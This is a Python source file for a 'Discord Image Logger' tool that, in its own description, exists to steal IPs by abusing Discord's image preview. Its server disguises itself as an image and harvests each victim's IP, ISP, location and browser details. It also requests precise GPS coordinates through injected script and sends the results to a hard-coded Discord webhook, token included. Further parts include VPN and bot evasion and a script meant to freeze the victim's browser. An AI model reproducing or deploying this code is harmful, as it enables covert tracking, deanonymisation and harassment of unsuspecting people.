# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1436383990255718483/c4iDkzHdGvo9CM9mOpKVHydBf7RG7ddjQZ6mWRvRPZxIrun5CffsaH5fDgTUsBcdU3zD",
    "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAgCAYAAAAffCjxAAAJxklEQVR4AQBJALb/AFBXUv9SWFL/VVlR/1paUf9gW1H/Zl1S/21gUv90Y1T/emZW/39pWf+DbVz/h3Bg/4l0Y/+Ld2f/jHpr/4x8bv+NfnD/jX9x/wBJALb/AFBXUv9SWFH/VVhR/1paUf9gW1H/Zl1R/21gUv90YlP/emZW/39pWP+DbVv/h3Bf/4l0Y/+Ld2f/jHpq/4x8bf+Nfm//jX9w/wBJALb/AFFXUf9SWFH/VlhR/1tZUP9gW1D/Z11R/21fUf90YlP/emVV/39pWP+DbFv/h3Be/4lzYv+Ld2b/jHlq/4x8bP+MfW//jX5w/wBJALb/AFFXUP9TV1D/VlhQ/1tZUP9hW1D/Z11Q/25fUf90YlL/emVU/39oV/+DbFr/h29d/4lzYf+LdmX/jHlo/4x7a/+MfG3/jH1u/wBJALb/AFJXT/9TV0//V1hP/1tZT/9hWk//Z1xP/25eT/90YVH/emRT/39nVf+Da1j/h25c/4lyYP+KdWT/i3hn/4x6av+Me2z/jHxt/wBJALb/AFJWTv9UVk7/V1dO/1xYTf9iWk3/aFtN/25eTv90YE//emNR/39mVP+Dalf/hm1a/4lxXv+KdGL/i3Zl/4t5aP+Lemr/i3tr/wBJALb/AFNWTf9VVk3/WFdM/11YTP9iWUz/aFtM/25dTf91X07/emJQ/39lUv+DaVX/hmxY/4hvXP+JcmD/inVj/4t3Zv+LeWj/i3lp/wBJALb/AFRVTP9VVUv/WVZL/11XS/9iWEr/aVpK/29cS/91Xkz/emFO/39kUP+DZ1P/hmtW/4huWv+JcV7/iXRh/4p2ZP+Kd2b/inhn/wBJALb/AFRUSv9WVUr/WVVK/15WSf9jV0n/aVlJ/29bSf91XUr/emBM/39jTv+CZlH/hWlU/4dsWP+Ib1v/iHJe/4l0Yf+JdWP/iXZk/wBJALb/AFVUSf9XVEn/WlVI/15VSP9jV0f/aVhH/29aSP91XEj/el9K/35iTP+CZU//hGhS/4ZrVf+HbVn/h3Bc/4dyX/+Hc2H/h3Rh/wBJALb/AFVTR/9XU0f/WlRH/15VRv9jVkb/aVdG/29ZRv90W0f/eV1I/31gSv+BY03/g2ZQ/4VpU/+FbFb/hm5Z/4ZwXP+GcV7/hXJf/wBJALb/AFZSRv9XU0b/WlNF/15URf9jVUT/aVZE/25YRP90WkX/eFxG/3xfSP+AYUv/gmRO/4NnUf+EalT/hGxX/4RuWf+Eb1v/hHBc/wBJALb/AFZSRf9XUkX/WlJE/15TRP9jVEP/aFVD/25XQ/9zWEP/d1tE/3tdRv9+YEn/gGJL/4FlTv+CZ1L/gmpV/4JrV/+BbVn/gW1a/wBJALb/AFVRRP9XUUT/WlFD/15SQv9iU0L/aFRB/21VQf9yV0L/dllD/3pbRP98Xkf/fmBJ/39jTP+AZU//f2hS/39pVf9/alb/f2tX/wBJALb/AFVQQ/9WUEP/WVFC/11RQv9iUkH/Z1NA/2xUQP9wVkD/dFhB/3haQ/96XEX/fF9H/31hSv99Y03/fWVQ/3xnUv98aFT/fGlV/wBJALb/AFRQQ/9WUEL/WFBC/1xQQf9gUUD/ZVI//2pTP/9vVD//c1ZA/3ZYQf94WkP/eV1G/3pfSf96YUv/emNO/3llUP95ZlL/eGZT/wBJALb/AFNPQv9VT0L/V09B/1tQQP9fUD//ZFE//2hSPv9tUz7/cFU//3NXQP91WUL/d1tE/3ddR/93X0r/dmFM/3ZiT/91Y1D/dWRR/wBJALb/AFJOQv9TTkL/Vk9B/1lPQP9eTz//YlA+/2ZRPv9rUj7/blM+/3FVP/9zV0H/dFlD/3RbRv90XUj/c19L/3JgTf9yYU//cWJP/wBJALb/AFFOQv9STkL/VE5B/1hOQP9cTj//YE8+/2RQPf9oUT3/a1I+/25UP/9wVUD/cFdC/3BZRf9wW0f/b11K/25eTP9uX03/bV9O/wBJALb/AE9NQ/9QTUL/U01B/1ZOQP9aTj//Xk4+/2JPPf9mUD3/aVE9/2tSPv9sVED/bVZB/21XRP9sWUb/a1tJ/2pcS/9qXUz/aV1N/wBJALb/AE1NQ/9OTUP/UU1C/1RNQf9XTT//W00+/19OPf9jTz3/ZlA9/2hRPv9pUj//aVRB/2lWQ/9oV0b/Z1lI/2ZaSv9lW0v/ZVtM/wBJALb/AEtMRP9MTEP/TkxC/1JMQf9VTED/WU0//11NPv9gTj3/Y089/2VQPv9mUT//ZlNB/2VUQ/9kVkX/Y1dH/2JYSf9hWUr/YVlL/wBJALb/AElMRf9KTET/TExD/09MQv9TTED/Vkw//1pMPv9dTT3/YE49/2FPPv9iUD//YlFB/2JTQ/9hVEX/X1VH/15WSf9dV0r/XVhL/wBJALb/AEdMRv9ITEX/SkxE/01LQ/9QS0H/VEtA/1dMP/9aTD7/XU0+/15OPv9fTz//X1BB/15RQ/9dU0X/W1RH/1pVSP9ZVUr/WVZK/wBJALb/AEVLRv9GS0b/SEtF/0tLQ/9OS0L/UktA/1VLP/9YSz7/Wkw+/1tNPv9cTj//XE9B/1tQQ/9ZUUX/WFJH/1ZTSP9VVEr/VVRK/wBJALb/AENLR/9ES0f/RktG/0lLRP9MS0P/T0pB/1NKQP9VSz//V0s//1lMP/9ZTUD/WU5B/1dPQ/9WUEX/VFFH/1NSSP9SU0n/UVNK/wBJALb/AEFLSP9CS0j/REtH/0dKRf9KSkP/TUpC/1BKQP9TSj//VUo//1ZLP/9WTED/Vk1B/1VOQ/9TT0X/UVBH/1BRSP9PUkr/TlJK/wBJALb/AEBLSf9BS0j/Q0tH/0VKRv9ISkT/S0pD/05KQf9RSkD/U0o//1RKQP9US0D/U0xC/1JNQ/9QTkX/T09H/01QSP9MUUr/S1FK/wBJALb/AD5LSv8/S0n/QUpI/0RKR/9HSkX/SklD/01JQv9PSUD/UUpA/1JKQP9SS0H/UUxC/1BNQ/9OTkX/TU5H/0tPSf9KUEr/SVBK/wBJALb/AD1LSv8+S0r/QEpJ/0NKR/9GSkX/SUlE/0xJQv9OSUH/UElA/1BKQP9RSkH/UEtC/05MRP9NTUX/S05H/0lPSf9IT0r/R1BK/wBJALb/AD1LS/8+Skr/P0pJ/0JKR/9FSUb/SElE/0tJQv9NSUH/T0lA/1BJQP9PSkH/T0tC/01MRP9MTUX/Sk5H/0hOSf9HT0r/Rk9L/wFJALb/ADxLS/89Skr/P0pJ/0JKSP9ESUb/R0lE/0pJQv9NSUH/TklB/09JQf9PSkH/TktC/01MRP9LTUb/SU1H/0dOSf9GT0r/RU9L/+kyk7zqIeIEAAAAAElFTkSuQmCC", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
